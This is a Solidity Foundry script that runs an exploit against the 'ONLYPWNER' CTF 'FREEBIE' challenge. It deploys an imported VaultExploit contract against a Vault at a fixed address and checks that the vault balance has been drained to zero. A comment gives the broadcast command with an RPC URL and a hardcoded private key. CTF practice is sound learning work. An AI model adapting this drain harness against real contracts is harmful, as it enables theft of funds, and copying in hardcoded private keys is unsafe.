// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Script } from "@dev/forge-std/Script.sol";
import { console2 } from "@dev/forge-std/console2.sol";
import { Vault, IVault, VaultExploit } from "@contracts/CTF/ONLYPWNER/01.FREEBIE.sol";

/*

forge script \
    foundry/script/CTF/ONLYPWNER/01.FREEBIE.s.sol:FREEBIE_05_Exploit \
    --rpc-url https://nodes.onlypwner.xyz/rpc/fc49f74c-8fbf-492e-9bbc-5c32fea00c21 \
    --private-key be0a5d9f38057fa406c987fd1926f7bfc49f094dc4e138fc740665d179e6a56a \
    --with-gas-price 0 \
    -vvvv  --broadcast
*/

contract FREEBIE_05_Exploit is Script {
    Vault private victimInstance;
    VaultExploit private exploitInstance;

    function _localSetup() public {
        victimInstance = new Vault();
        victimInstance.deposit{ value: 10 ether }();
    }

    function run() public {
        vm.startBroadcast();
        bool isDEV = false;
        // 1. Local DEV SET UP
        if (isDEV) _localSetup();
        // 2. Challenge SET UP
        else victimInstance = Vault(0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88);

        console2.log("ONLYPWNER CTF Challenge 1 Before Valut Balance:", address(victimInstance).balance);
        console2.log("ONLYPWNER CTF Challenge 1 Before Attacker:", tx.origin);
        console2.log("ONLYPWNER CTF Challenge 1 Before Attacker Balance:", address(tx.origin).balance);

        // Attack
        exploitInstance = new VaultExploit(address(victimInstance));
        exploitInstance.attack();

        _check();
        vm.stopBroadcast();
    }

    function _check() public view {
        console2.log("ONLYPWNER CTF Challenge 1 After Balance:", address(victimInstance).balance);
        require(address(victimInstance).balance == 0, "Challenge 1 is not solved");
    }
}
